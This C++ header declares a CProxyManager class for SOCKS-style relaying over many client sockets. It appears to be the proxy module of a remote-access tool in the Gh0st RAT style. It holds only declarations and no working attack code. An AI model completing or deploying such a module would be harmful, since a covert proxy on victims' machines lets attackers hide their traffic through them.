#pragma once

#include <winsock2.h>
#include "Manager.h"
#define SAFE_TERMINATE(handle,times)  if (WaitForSingleObject(handle, times)!=WAIT_OBJECT_0) \
										TerminateThread(handle, 0);

class CProxyManager : public CManager
{
public:
	CProxyManager(CClientSocket* pClient);
	virtual ~CProxyManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	CRITICAL_SECTION   Sec;
	int Send(LPBYTE lpData, UINT nSize);
	void Disconnect(DWORD index);
	SOCKET m_Socket[10000];
	void SendConnectResult(LPBYTE lpBuffer, DWORD ip, USHORT port);
protected:
	void SendErr(LPBYTE Msg);


private:

	DWORD	m_nSend;
};
static DWORD WINAPI SocksThread(LPVOID lparam);
struct SocksThreadArg
{
	CProxyManager* pThis;
	LPBYTE lpBuffer;
};